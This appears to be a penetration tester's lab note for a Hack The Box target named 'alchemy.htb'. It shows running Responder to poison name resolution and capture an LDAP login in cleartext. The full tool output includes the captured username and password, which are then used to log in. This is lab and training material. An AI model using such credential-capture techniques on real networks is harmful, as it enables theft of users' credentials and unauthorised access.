# Credentials
`calde_ldap@alchemy.htb:CsAdlLDAPMoDeBrnd12!`

in burp `/login` shows ldap post request
![[Pasted image 20240612162314.png]]
open up responder to get credentials
```bash
┌──(kali㉿gobots)-[12Jun2024 18:10:22]-[~/SUT/Alchemy]                                                                                                                                                      
└─$ sudo responder -I tun0                                                                                                                                                                                  
                                         __                                                                                                                                                                 
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                                                                    
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                                                                    
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                                                                                      
                   |__|                                                                                                                                                                                     
                                                                                                                                                                                                            
           NBT-NS, LLMNR & MDNS Responder 3.1.4.0                                                                                                                                                           
                                                                                                                                                                                                            
  To support this project:                                                                                                                                                                                  
  Github -> https://github.com/sponsors/lgandx                                                                                                                                                              
  Paypal  -> https://paypal.me/PythonResponder                                                                                                                                                              
                                                                                                                                                                                                            
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)                                                                                                                                                         
  To kill this script hit CTRL-C                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
[+] Poisoners:                                                                                                                                                                                              
    LLMNR                      [ON]                                                                                                                                                                         
    NBT-NS                     [ON]                                                                                                                                                                         
    MDNS                       [ON]                                                                                                                                                                         
    DNS                        [ON]                                                                                                                                                                         
    DHCP                       [OFF]                                                                                                                                                                        
                                                                                                                                                                                                            
[+] Servers:                                                                                                                                                                                                
    HTTP server                [ON]                                                                                                                                                                         
    HTTPS server               [ON]                                                                                                                                                                         
    WPAD proxy                 [OFF]                                                                                                                                                                        
    Auth proxy                 [OFF]                                                                                                                                                                        
    SMB server                 [ON]                                                                                                                                                                         
    Kerberos server            [ON]                                                                                                                                                                         
    SQL server                 [ON]                                                                                                                                                                         
    FTP server                 [ON]          
        IMAP server                [ON]                                                                                                                                                                         
    POP3 server                [ON]                                                                                                                                                                         
    SMTP server                [ON]                                                                                                                                                                         
    DNS server                 [ON]                                                                                                                                                                         
    LDAP server                [ON]                                                                                                                                                                         
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.39]
    Responder IPv6             [dead:beef:2::1025]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-4IZ1QJ5DOVQ]
    Responder Domain Name      [DFKE.LOCAL]
    Responder DCE-RPC Port     [45141]

[+] Listening for events...

[LDAP] Cleartext Client   : 10.10.110.21
[LDAP] Cleartext Username : calde_ldap@alchemy.htb
[LDAP] Cleartext Password : CsAdlLDAPMoDeBrnd12!
                          
```
login with credentials the credentials 
![[Pasted image 20240612162458.png]]
